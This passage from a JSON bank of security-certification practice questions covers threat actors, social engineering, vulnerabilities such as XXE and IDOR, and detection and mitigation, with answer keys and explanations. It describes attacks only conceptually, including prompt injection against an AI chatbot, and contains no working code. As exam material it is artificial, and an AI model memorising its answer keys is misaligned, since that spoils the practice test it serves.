  "exp": "Keyloggers record keystrokes to steal credentials. They are often delivered as part of a Trojan (masquerading as something else) to maintain persistence on the system."
 },
 {
  "id": 354,
  "obj": "2.1",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A former employee who still has active access to the company's AWS environment deletes several production S3 buckets out of spite. What actor type is this?",
  "opts": [
   "A. Hacktivist",
   "B. Nation-state",
   "C. Malicious Insider",
   "D. Competitor"
  ],
  "correct": 2,
  "exp": "A malicious insider is a current or former employee who uses their authorized access or knowledge of systems to cause harm to the organization."
 },
 {
  "id": 355,
  "obj": "2.5",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An organization wants to ensure that all mobile devices connecting to the internal network meet specific security criteria, such as being encrypted and not jailbroken. Which technology is BEST for this?",
  "opts": [
   "A. Next-Generation Firewall (NGFW)",
   "B. Mobile Device Management (MDM) / Unified Endpoint Management (UEM)",
   "C. Intrusion Prevention System (IPS)",
   "D. WAF"
  ],
  "correct": 1,
  "exp": "MDM/UEM solutions allow organizations to enforce security policies (posture checks) on mobile devices, such as requiring encryption, PINs, and prohibiting jailbreaking/rooting."
 },
 {
  "id": 391,
  "obj": "2.2",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker interacts with a company's customer service chatbot. By providing carefully crafted input, the attacker tricks the chatbot into revealing its internal system instructions and sensitive API keys. What is this attack?",
  "opts": [
   "A. SQL Injection",
   "B. AI Prompt Injection",
   "C. XSS",
   "D. Cross-site request forgery"
  ],
  "correct": 1,
  "exp": "Prompt injection involves providing malicious instructions to a Large Language Model (LLM) or AI to bypass its safety filters and extract unauthorized information."
 },
 {
  "id": 392,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker gains access to a regular employee's account. They then use a vulnerability in the kernel to grant that account 'Domain Admin' rights. Which type of privilege escalation is this?",
  "opts": [
   "A. Horizontal",
   "B. Vertical",
   "C. Cross-site",
   "D. Replay"
  ],
  "correct": 1,
  "exp": "Vertical privilege escalation involves moving from a lower-privileged state to a higher-privileged state (user to admin). Horizontal escalation (A) is moving between accounts with the same privilege level."
 },
 {
  "id": 393,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst is investigating a suspicious process. They notice that the Parent Process ID (PPID) for <code>cmd.exe</code> is <code>notepad.exe</code>. Why is this suspicious?",
  "opts": [
   "A. Notepad is not allowed to run on corporate machines",
   "B. It suggests a process hollowing or malicious macro attack where a benign app spawned a shell",
   "C. Cmd.exe should only ever have a PPID of 0",
   "D. Notepad is a 64-bit application"
  ],
  "correct": 1,
  "exp": "Analyzing parent-child process relationships is key to threat hunting. A text editor like Notepad spawning a command shell is a major red flag for malicious activity."
 },
 {
  "id": 394,
  "obj": "2.5",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An organization is defining a process where security updates are first tested in a lab, then deployed to a small group of pilot users, and finally rolled out to the whole company. Which process is this?",
  "opts": [
   "A. Hardening",
   "B. Staged Patch Management",
   "C. Data Masking",
   "D. Sandboxing"
  ],
  "correct": 1,
  "exp": "Staged patch management ensures that updates do not break production systems by testing them in increasingly larger 'rings' or groups."
 },
 {
  "id": 395,
  "obj": "2.1",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A group of attackers is motivated by a desire to embarrass a major corporation for its environmental record. They perform a DDoS attack against the company's website. Which actor type is this?",
  "opts": [
   "A. APT",
   "B. Hacktivist",
   "C. Script Kiddie",
   "D. Shadow IT"
  ],
  "correct": 1,
  "exp": "Hacktivists are motivated by political or social causes. Their attacks are often symbolic, designed to draw attention to an issue."
 },
 {
  "id": 421,
  "obj": "2.2",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker creates a fake LinkedIn profile claiming to be a technical recruiter. They reach out to employees of a target firm, citing that many of their 'colleagues' have already applied for a new role. Which principle is this?",
  "opts": [
   "A. Scarcity",
   "B. Consensus / Social Proof",
   "C. Urgency",
   "D. Authority"
  ],
  "correct": 1,
  "exp": "Consensus (or Social Proof) is the psychological phenomenon where people look to others to see what is normal or safe. By saying 'your colleagues did it,' the attacker lowers the victim's guard."
 },
 {
  "id": 422,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker compromises a standard user account. They then discover a vulnerability in an installed service that allows them to gain access to a different standard user's account on the same system. What is this?",
  "opts": [
   "A. Vertical Privilege Escalation",
   "B. Horizontal Privilege Escalation",
   "C. Domain Dominance",
   "D. Zero-Day"
  ],
  "correct": 1,
  "exp": "Horizontal privilege escalation occurs when an attacker gains access to resources or accounts with the same level of privilege as the one they already have."
 },
 {
  "id": 423,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst is reviewing running processes on a Windows server. Which of the following Parent Process IDs (PPID) would be MOST suspicious for a web server process (w3wp.exe)?",
  "opts": [
   "A. svchost.exe",
   "B. cmd.exe",
   "C. services.exe",
   "D. wininit.exe"
  ],
  "correct": 1,
  "exp": "Web server processes (like w3wp.exe or httpd) spawning a command shell (cmd.exe or powershell.exe) is a major indicator of a remote code execution (RCE) or web shell attack."
 },
 {
  "id": 424,
  "obj": "2.5",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An organization uses an automated tool to compare its current server configurations against a 'gold image' to detect unauthorized changes. Which mitigation is this?",
  "opts": [
   "A. Patch Management",
   "B. Configuration Management / Baselines",
   "C. Sandboxing",
   "D. Honeypot"
  ],
  "correct": 1,
  "exp": "Configuration management uses baselines (like gold images) to ensure systems remain in a secure, known-good state and to detect 'configuration drift.'"
 },
 {
  "id": 425,
  "obj": "2.1",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "Which threat actor is most likely to use 'low and slow' techniques to remain in a target network for years to conduct industrial espionage?",
  "opts": [
   "A. Script Kiddie",
   "B. Organized Crime",
   "C. APT (Advanced Persistent Threat)",
   "D. Hacktivist"
  ],
  "correct": 2,
  "exp": "APTs are characterized by their persistence and long-term goals. They prioritize stealth over rapid destruction to maximize data collection over time."
 },
 {
  "id": 426,
  "obj": "2.2",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker sends a convincing email to a finance manager pretending to be a known vendor and claiming that their banking details have changed. What type of attack is this?",
  "opts": [
   "A. Smishing",
   "B. Business Email Compromise (BEC)",
   "C. Watering Hole",
   "D. Vishing"
  ],
  "correct": 1,
  "exp": "BEC targets specific business roles (usually finance) to trick them into performing unauthorized transfers or disclosing sensitive financial info by impersonating vendors or executives."
 },
 {
  "id": 427,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A user notices that by changing the URL from <code>/view_profile?id=101</code> to <code>/view_profile?id=102</code>, they can see another user's private data. Which vulnerability is this?",
  "opts": [
   "A. SQL Injection",
   "B. Insecure Direct Object Reference (IDOR)",
   "C. XSS",
   "D. CSRF"
  ],
  "correct": 1,
  "exp": "IDOR occurs when an application provides direct access to objects based on user-supplied input without proper authorization checks."
 },
 {
  "id": 428,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker steals a Kerberos TGT (Ticket Granting Ticket) from a user's memory to impersonate them across the network. Which technique is this?",
  "opts": [
   "A. Pass-the-Hash",
   "B. Pass-the-Ticket",
   "C. SQL Injection",
   "D. ARP Spoofing"
  ],
  "correct": 1,
  "exp": "Pass-the-Ticket (PtT) is a lateral movement technique using Kerberos tickets. Pass-the-Hash (PtH) (A) uses NTLM hashes."
 },
 {
  "id": 429,
  "obj": "2.5",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An organization wants to ensure that corporate applications on a mobile device are automatically disabled whenever the device leaves the physical office building. Which technology should they use?",
  "opts": [
   "A. Biometrics",
   "B. Geofencing",
   "C. Remote Wipe",
   "D. Screen Lock"
  ],
  "correct": 1,
  "exp": "Geofencing uses GPS, Wi-Fi, or cellular data to create a virtual boundary. MDM solutions can trigger security actions (like disabling apps) based on the device's location."
 },
 {
  "id": 430,
  "obj": "2.1",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A department manager buys and installs a wireless router without informing the IT department to improve their team's connectivity. What is the PRIMARY security concern?",
  "opts": [
   "A. Insider Threat",
   "B. Shadow IT / Rogue Access Point",
   "C. Supply Chain Attack",
   "D. Vishing"
  ],
  "correct": 1,
  "exp": "Shadow IT introduces unmanaged hardware or software into the network, creating security blind spots and potentially introducing vulnerabilities (like an unencrypted rogue AP)."
 },
 {
  "id": 471,
  "obj": "2.2",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An employee receives a phone call from someone who sounds exactly like their manager, using a familiar greeting and referencing personal details. The caller asks for an immediate password reset. The voice was actually generated by AI. What is this?",
  "opts": [
   "A. Smishing",
   "B. AI-Voice Cloning / Deepfake Vishing",
   "C. Typosquatting",
   "D. Baiting"
  ],
  "correct": 1,
  "exp": "AI voice cloning is a modern vishing technique where attackers use deepfake technology to mimic a trusted person's voice to build false trust."
 },
 {
  "id": 472,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An organization wants to identify all third-party components and libraries used within their custom applications to manage supply chain risk. Which document should they request from developers?",
  "opts": [
   "A. SLA",
   "B. SBOM (Software Bill of Materials)",
   "C. NDA",
   "D. Vulnerability Scan Report"
  ],
  "correct": 1,
  "exp": "An SBOM is a formal, machine-readable inventory of all software components, dependencies, and hierarchical relationships used in an application."
 },
 {
  "id": 473,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst notices that when an employee opens a specific Excel file, a hidden script runs that attempts to download an executable from an external IP. What type of malicious behavior is this?",
  "opts": [
   "A. SQL Injection",
   "B. Malicious Macro",
   "C. Buffer Overflow",
   "D. Logic Bomb"
  ],
  "correct": 1,
  "exp": "Macros are scripts used to automate tasks in documents. Attackers use malicious macros to execute code or download payloads once the document is opened."
 },
 {
  "id": 474,
  "obj": "2.5",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An organization cannot patch a legacy system because the vendor is out of business. They decide to move the system to a restricted VLAN with no internet access. What is this called?",
  "opts": [
   "A. Risk Avoidance",
   "B. Compensating Control",
   "C. Risk Transference",
   "D. Risk Appetite"
  ],
  "correct": 1,
  "exp": "A compensating control is an alternative measure implemented when the primary control (patching) cannot be used."
 },
 {
  "id": 475,
  "obj": "2.1",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "Which threat actor type is primarily motivated by gaining notoriety or proving their technical skills rather than financial gain or political change?",
  "opts": [
   "A. APT",
   "B. Organized Crime",
   "C. Script Kiddie",
   "D. Nation-state"
  ],
  "correct": 2,
  "exp": "Script kiddies often use pre-made tools to launch attacks for fun, curiosity, or to gain status within their social circles."
 },
 {
  "id": 700,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A threat intelligence team discovers that a competitor company has hired freelance hackers on a dark web forum to steal proprietary product designs. The attackers use commodity malware and basic spear phishing. Which threat actor category BEST describes the hired attackers?",
  "opts": [
   "A. Nation-state",
   "B. Unskilled attacker (script kiddie)",
   "C. Competitor-sponsored / semi-organized threat actor",
   "D. Hacktivist"
  ],
  "correct": 2,
  "exp": "Competitor-sponsored threat actors are hired by a business rival to conduct corporate espionage. They may range from moderately to highly skilled, but their distinguishing trait is that they are externally funded by a competitor with the specific goal of stealing intellectual property or trade secrets. Nation-state actors (A) are government-backed with geopolitical motives. Unskilled attackers (B) act on their own initiative, not for hire. Hacktivists (D) are ideologically motivated. The SY0-701 exam recognizes that threat actors can be categorized by motivation, capability, and sponsorship — competitor-sponsored actors fill a distinct niche between organized crime and nation-states."
 },
 {
  "id": 701,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst discovers that a company's public-facing API documentation accidentally includes internal endpoint URLs and an example authentication token that is still valid. Which concept BEST describes this exposure?",
  "opts": [
   "A. Zero-day vulnerability",
   "B. Attack surface created by information disclosure",
   "C. Supply chain compromise",
   "D. Insider threat"
  ],
  "correct": 1,
  "exp": "Information disclosure expands the attack surface by unintentionally revealing internal details (endpoints, credentials, system architecture) that an attacker can use to plan or execute an attack. This is not a zero-day (A) because there is no unknown software flaw — it is an operational error that exposes sensitive information. Supply chain compromise (C) involves a third-party vendor. Insider threat (D) involves a person acting maliciously from within. Publicly exposed API documentation with live credentials is a common real-world attack surface issue — it provides attackers with a roadmap and valid keys to the environment."
 },
 {
  "id": 702,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A hospital's network-connected infusion pump runs a proprietary embedded operating system that cannot be updated or patched by the hospital's IT team. The device manufacturer provides updates only once per year. Which threat vector category does this device represent?",
  "opts": [
   "A. Removable media",
   "B. Open service ports",
   "C. Unsupported systems and IoT/embedded device risk",
   "D. Social engineering"
  ],
  "correct": 2,
  "exp": "IoT and embedded devices in healthcare environments represent a significant threat vector because they often run proprietary, unpatched firmware that the customer cannot update independently. These devices combine the risks of unsupported systems (no timely patches) with limited security controls (no endpoint agent, weak or no authentication). Removable media (A) involves physical storage devices. Open service ports (B) refer to unnecessarily exposed network services. Social engineering (D) targets humans. IoT/embedded devices are explicitly called out in SY0-701 as a threat vector because their long lifecycles, infrequent patching, and network connectivity create persistent vulnerabilities."
 },
 {
  "id": 703,
  "type": "multi",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice · Select TWO",
  "badgeClass": "multi-b",
  "stem": "A security architect is assessing the organization's attack surface. Which TWO of the following represent human-based threat vectors that bypass technical security controls?",
  "opts": [
   "A. A firewall rule permitting unnecessary inbound traffic on port 445",
   "B. An employee holding a secure door open for a stranger carrying boxes (tailgating)",
   "C. An unpatched Apache web server exposed to the internet",
   "D. A system administrator sharing their password with a colleague to cover a shift",
   "E. A DNS server configured with zone transfers enabled"
  ],
  "correct": [
   1,
   3
  ],
  "exp": "Human-based threat vectors exploit people rather than technology: (B) Tailgating bypasses physical access controls by exploiting social courtesy — the stranger did not authenticate but gained entry through a human's willingness to hold the door. (D) Password sharing circumvents authentication controls — even strong MFA is rendered useless if a user voluntarily gives credentials to another person. Firewall misconfigurations (A), unpatched software (C), and DNS misconfigurations (E) are all technical threat vectors. The exam distinguishes between human vectors (social engineering, policy violations, negligence) and technical vectors (misconfigurations, vulnerabilities, open ports)."
 },
 {
  "id": 704,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "During a security awareness exercise, an employee receives an email offering a free high-end laptop to the first 50 respondents. The email creates fear of missing out and urges immediate action. Which social engineering principle is the attacker primarily leveraging?",
  "opts": [
   "A. Authority",
   "B. Scarcity",
   "C. Consensus",
   "D. Intimidation"
  ],
  "correct": 1,
  "exp": "Scarcity exploits the fear of missing out (FOMO) by creating a perception of limited availability — 'only 50 laptops' and 'first come, first served' pressure the victim to act immediately without thinking critically. Authority (A) leverages a position of power (impersonating a CEO, law enforcement). Consensus (C) leverages social proof ('everyone else is doing it'). Intimidation (D) uses threats or aggressive behavior. Scarcity is commonly used in phishing by advertising limited-time offers, exclusive deals, or expiring account access to bypass rational decision-making."
 },
 {
  "id": 705,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker researches a company's HR director on LinkedIn and sends a targeted email referencing a real job posting, a recent company event, and the director's alma mater. The email contains a link to a fake applicant tracking portal. Which attack type is this?",
  "opts": [
   "A. Generic phishing",
   "B. Spear phishing",
   "C. Whaling",
   "D. Smishing"
  ],
  "correct": 1,
  "exp": "Spear phishing is a targeted phishing attack directed at a specific individual using personalized information gathered through OSINT (Open Source Intelligence). The attacker used LinkedIn research to craft a convincing, customized email referencing real details about the target. Generic phishing (A) is broad and untargeted with generic content. Whaling (C) targets senior executives (C-suite) specifically — an HR director is not typically classified as a whaling target. Smishing (D) uses SMS. The key differentiator: spear phishing combines personalization + targeting a specific individual + email delivery channel."
 },
 {
  "id": 706,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An organization discovers that an attacker has been modifying DNS records in its registrar account, redirecting the company's legitimate domain to a malicious server hosting a credential-harvesting page. Customers who type the correct URL still land on the fake site. Which attack is this?",
  "opts": [
   "A. Typosquatting",
   "B. DNS poisoning / pharming via domain hijacking",
   "C. On-path (man-in-the-middle) attack",
   "D. Watering hole"
  ],
  "correct": 1,
  "exp": "DNS poisoning or pharming via domain hijacking redirects users to a malicious site even when they type the correct URL, because the DNS records themselves have been altered. The attacker gained access to the domain registrar and changed the authoritative DNS records. Typosquatting (A) relies on users mistyping URLs — here users type the correct URL. An on-path attack (C) intercepts communication in transit without altering DNS records. A watering hole (D) compromises a third-party website. The distinguishing factor: users type the correct URL but DNS resolution sends them to the wrong IP because the DNS records were tampered with at the registrar level."
 },
 {
  "id": 707,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker compromises an employee's email account and silently creates an inbox rule that forwards all emails containing the words 'wire transfer,' 'invoice,' or 'payment' to an external address. The employee is unaware. This technique is MOST commonly associated with which attack?",
  "opts": [
   "A. Whaling",
   "B. Business email compromise (BEC) — mailbox rule persistence",
   "C. Vishing",
   "D. Smishing"
  ],
  "correct": 1,
  "exp": "Creating hidden inbox forwarding rules is a classic BEC persistence technique. After compromising the email account, the attacker sets up rules to silently intercept financial communications. This allows the attacker to monitor invoices and payment conversations, then intervene at the right moment to redirect funds. Whaling (A) targets C-suite executives with phishing — it is an initial compromise method, not a persistence technique. Vishing (C) and smishing (D) are voice and SMS social engineering channels. BEC inbox rule manipulation is particularly dangerous because it persists even if the user changes their password, unless the rule is specifically discovered and removed."
 },
 {
  "id": 708,
  "type": "multi",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice · Select TWO",
  "badgeClass": "multi-b",
  "stem": "A company wants to defend against social engineering attacks. Which TWO of the following are the MOST effective organizational countermeasures?",
  "opts": [
   "A. Installing a next-generation firewall at the network perimeter",
   "B. Implementing a formal callback verification procedure for financial requests",
   "C. Increasing the network bandwidth to prevent DDoS attacks",
   "D. Conducting regular simulated phishing campaigns with follow-up training for employees who fail",
   "E. Deploying full-disk encryption on all laptops"
  ],
  "correct": [
   1,
   3
  ],
  "exp": "Social engineering targets humans, so the most effective defenses are people-focused: (B) Callback verification procedures require staff to verify financial or sensitive requests by calling the requester back on a known, pre-established phone number — defeating BEC, pretexting, and vishing. (D) Simulated phishing campaigns measure susceptibility and provide targeted training to employees who click — this builds a security-aware culture through practical experience. Firewalls (A) are technical controls that do not prevent social engineering. DDoS mitigation (C) addresses availability attacks. Full-disk encryption (E) protects data at rest but does not prevent an employee from being manipulated into giving away credentials."
 },
 {
  "id": 709,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A web application uses a function that processes XML input from users. An attacker submits an XML document containing an external entity declaration that references the server's <code>/etc/shadow</code> file. The server returns the contents of the shadow file in its response. Which vulnerability is being exploited?",
  "opts": [
   "A. SQL injection",
   "B. XML External Entity (XXE) injection",
   "C. Cross-site scripting (XSS)",
   "D. Server-side request forgery (SSRF)"
  ],
  "correct": 1,
  "exp": "XML External Entity (XXE) injection exploits XML parsers that process external entity declarations. The attacker defines an entity that references a local file (like /etc/shadow) or an internal URL, and the parser resolves it, including the file contents in the response. While XXE can be used to achieve SSRF-like outcomes (D), the root vulnerability is the insecure XML parsing, not forged server requests. SQL injection (A) targets databases. XSS (C) injects client-side scripts. XXE prevention: disable external entity processing in XML parsers, use JSON instead of XML where possible, validate and sanitize XML input, and apply least privilege to the XML parser process."
 },
 {
  "id": 710,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A penetration tester discovers that a web application stores user passwords using the MD5 hashing algorithm with no salt. After extracting the password hashes, the tester uses a precomputed rainbow table to recover 80% of the plaintext passwords within minutes. Which vulnerability category does this represent?",
  "opts": [
   "A. Misconfiguration",
   "B. Cryptographic vulnerability — use of weak hashing algorithm",
   "C. Race condition",
   "D. Buffer overflow"
  ],
  "correct": 1,
  "exp": "Using MD5 for password hashing is a cryptographic vulnerability. MD5 is fast to compute (enabling rapid brute-force and rainbow table attacks), produces collisions, and is considered cryptographically broken for security purposes. The absence of a salt means identical passwords produce identical hashes, making precomputed rainbow tables effective. Proper password storage uses slow, salted hashing algorithms like bcrypt, scrypt, or Argon2. Misconfiguration (A) refers to improper system settings, not algorithm choice in code. Race conditions (C) involve timing issues. Buffer overflows (D) involve memory corruption. Weak cryptographic implementations are explicitly tested on SY0-701."
 },
 {
  "id": 711,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst runs a vulnerability scan against a production database server. The scan reports a critical SQL injection vulnerability. However, upon manual investigation, the analyst confirms the finding is incorrect — the application properly uses parameterized queries. What should the analyst classify this finding as?",
  "opts": [
   "A. True positive",
   "B. False negative",
   "C. False positive",
   "D. True negative"
  ],
  "correct": 2,
  "exp": "A false positive occurs when a security tool reports a vulnerability that does not actually exist. The scanner flagged SQL injection, but manual verification confirmed the application is not vulnerable (parameterized queries are in place). A true positive (A) is a correctly identified real vulnerability. A false negative (B) is a real vulnerability that the scanner missed. A true negative (D) is when the scanner correctly identifies no vulnerability. False positives are common in vulnerability scanning and waste analyst time — this is why validation/triage of scan results is critical. Credentialed scans and scanner tuning help reduce false positives."
 },
 {
  "id": 712,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A developer hardcodes an API key and database connection string directly into the application source code. The code is then pushed to a public GitHub repository. Which vulnerability type does this represent?",
  "opts": [
   "A. Buffer overflow",
   "B. Hardcoded credentials / secrets in code",
   "C. Race condition",
   "D. Cross-site scripting"
  ],
  "correct": 1,
  "exp": "Hardcoded credentials (API keys, passwords, connection strings) embedded in source code become exposed when code is shared, stored in version control, or decompiled. Publishing them to a public repository makes these secrets immediately available to anyone. This is a common and critical vulnerability in modern software development. Buffer overflow (A) involves memory corruption. Race conditions (C) involve timing issues. XSS (D) involves script injection. Mitigation: use environment variables, secrets management solutions (HashiCorp Vault, AWS Secrets Manager), .gitignore for config files, and automated secret scanning tools in CI/CD pipelines."
 },
 {
  "id": 713,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A SOC analyst observes that a compromised workstation is communicating with a C2 server using HTTPS on port 443, with traffic blending into normal web browsing patterns. The attacker uses legitimate cloud services (like a GitHub repository or a Google Drive folder) as the C2 channel. Why is this technique effective at evading detection?",
  "opts": [
   "A. HTTPS traffic on port 443 is never inspected by firewalls",
   "B. The traffic uses legitimate domains and encrypted channels that blend with normal business traffic",
   "C. Port 443 cannot be blocked by any security device",
   "D. Cloud services automatically anonymize all traffic"
  ],
  "correct": 1,
  "exp": "Using legitimate cloud services (GitHub, Google Drive, Azure Blob, Slack) as C2 channels is a sophisticated evasion technique because: the traffic goes to trusted, high-reputation domains that are unlikely to be blocked; HTTPS encryption prevents content inspection without TLS interception; and the traffic patterns mimic normal user behavior. HTTPS traffic can be inspected (A) using TLS decryption on next-gen firewalls or proxies. Port 443 can be blocked (C) though this would break most web traffic. Cloud services do not anonymize traffic (D). This technique is called 'domain fronting' or 'C2 over legitimate services' and is increasingly used by APTs to evade network-based detection."
 },
 {
  "id": 714,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "During an investigation, a forensic analyst discovers that an attacker used a compromised service account to access a file server, then used the same account to access a database server, and finally reached the domain controller. Which MITRE ATT&CK tactic does this movement between systems represent?",
  "opts": [
   "A. Persistence",
   "B. Privilege Escalation",
   "C. Lateral Movement",
   "D. Exfiltration"
  ],
  "correct": 2,
  "exp": "Lateral movement (MITRE ATT&CK TA0008) describes techniques attackers use to move through a network from one system to another after initial compromise. The attacker pivoted from the file server to the database server to the domain controller — each hop is lateral movement. Persistence (A) is maintaining access across reboots. Privilege escalation (B) is gaining higher permissions on a single system. Exfiltration (D) is stealing data out of the network. Lateral movement is a critical phase in the attack lifecycle — it is how attackers expand their reach from a single compromised system to high-value targets like domain controllers."
 },
 {
  "id": 715,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A threat intelligence feed provides a list of 500 known malicious IP addresses, 200 file hashes associated with a specific ransomware family, and 50 domain names used for C2 infrastructure. A security team imports these into their SIEM and firewall. What type of threat intelligence is being consumed?",
  "opts": [
   "A. Strategic intelligence",
   "B. Operational intelligence",
   "C. Tactical intelligence (TTPs)",
   "D. Technical intelligence (IOCs)"
  ],
  "correct": 3,
  "exp": "Technical intelligence consists of specific, machine-consumable indicators of compromise (IOCs): IP addresses, file hashes, domain names, URLs, email addresses, and registry keys. These are imported directly into security tools (SIEMs, firewalls, EDR, email gateways) for automated detection and blocking. Strategic intelligence (A) informs executive risk decisions. Operational intelligence (B) describes specific active campaigns. Tactical intelligence (C) describes TTPs (techniques, tactics, procedures) — the 'how' of attacks at a behavioral level. Technical IOCs are the most granular and perishable form of threat intelligence — attackers frequently change infrastructure, making IOCs short-lived."
 },
 {
  "id": 716,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An analyst discovers that a compromised Linux server has a new cron job entry that executes a Python reverse shell script every day at 2:00 AM. This cron job was not created by any authorized administrator. Which two MITRE ATT&CK tactics does this evidence MOST directly represent?",
  "opts": [
   "A. Initial Access and Reconnaissance",
   "B. Persistence and Command & Control",
   "C. Collection and Impact",
   "D. Discovery and Resource Development"
  ],
  "correct": 1,
  "exp": "The unauthorized cron job represents Persistence (TA0003) — the attacker ensured their access survives system reboots by scheduling the script to run automatically every day. The reverse shell script itself represents Command & Control (TA0011) — it establishes an outbound connection back to the attacker's server, giving them remote access. Initial Access (A) is the first compromise method (how they got in initially). Reconnaissance is pre-attack information gathering. Collection (C) involves gathering data from the target. Impact involves disruption. Cron jobs and scheduled tasks are among the most common persistence mechanisms on Linux and Windows respectively."
 },
 {
  "id": 717,
  "type": "multi",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice · Select TWO",
  "badgeClass": "multi-b",
  "stem": "A security team is building detection rules for their SIEM. Which TWO of the following are reliable indicators that a workstation may be part of a botnet?",
  "opts": [
   "A. The workstation has a static IP address assigned",
   "B. The workstation generates outbound traffic spikes at unusual hours when no user is logged in",
   "C. The workstation's antivirus definitions were updated yesterday",
   "D. The workstation resolves DNS queries for rapidly changing, algorithmically generated domain names (DGA domains)",
   "E. The workstation has a local administrator account enabled"
  ],
  "correct": [
   1,
   3
  ],
  "exp": "Botnet indicators include: (B) Outbound traffic spikes at unusual hours with no active user suggest automated bot activity — botnets often perform tasks (DDoS, spam, crypto mining) on schedules or commands received from C2. (D) Domain Generation Algorithm (DGA) domains are a hallmark of botnet C2 communication — the bot generates pseudorandom domain names to find the current C2 server, making takedowns difficult. A static IP (A) is a normal network configuration. Updated antivirus (C) is a sign of good maintenance. A local admin account (E) is common and not inherently indicative of compromise. DGA detection and anomalous traffic pattern analysis are key SIEM detection strategies for botnets."
 },
 {
  "id": 718,
  "type": "mcq",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "After a breach, a forensic investigation reveals that the attacker initially compromised a low-privilege web application account and then used that access to query the cloud metadata service, obtaining IAM credentials with broad permissions. Which mitigation would MOST directly have prevented the privilege escalation?",
  "opts": [
   "A. Enabling full-disk encryption on the web server",
   "B. Restricting the IAM role attached to the web server to minimum required permissions (least privilege)",
   "C. Implementing a web application firewall (WAF)",
   "D. Conducting annual penetration testing"
  ],
  "correct": 1,
